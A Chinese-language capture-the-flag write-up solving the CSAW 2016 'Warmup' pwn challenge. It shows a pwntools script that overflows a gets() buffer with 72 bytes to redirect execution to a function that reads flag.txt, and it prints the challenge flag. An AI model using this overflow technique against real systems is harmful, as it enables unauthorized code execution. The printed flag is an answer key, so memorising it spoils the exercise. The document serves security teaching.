# CSAW CTF 2016 Quals: Warmup (Pwn, 50)

說明：
> So you want to be a pwn-er huh? Well let's throw you an easy one ;)
>
> [warmup](https://github.com/ctfs/write-ups-2016/raw/master/csaw-ctf-2016-quals/Pwn/WarmUp-50/warmup)

## 解題

執行binary得到以下output：

```
-Warm Up-
WOW:0x40060d
>
```

`WOW` 後面跟著的記憶位址，用Hopper Disassembler找到是個叫`easy`的function。這個function會執行`system("cat flag.txt")`，所以只要buffer overflow覆寫return address到這個位址就可以得到flag。

![easy](easy.png)

這是題50分的熱身題，所以在`main`就能找到個簡單的`gets()`buffer overflow bug。

![main](main.png)

64 bytes buffer，加上stack上的8 bytes`$rbp`，總共要72 bytes去overflow return address：

```python
from pwn import *

r = remote('pwn.chal.csaw.io', 8000)
r.recv()
r.sendline("A"*72 + p64(0x40060d))
print r.recvline()
```

完整解答：[warmup.py](warmup.py)

## Flag

```
FLAG{LET_US_BEGIN_CSAW_2016}
```

## 其他解答

- https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/Pwn/WarmUp-50/README.md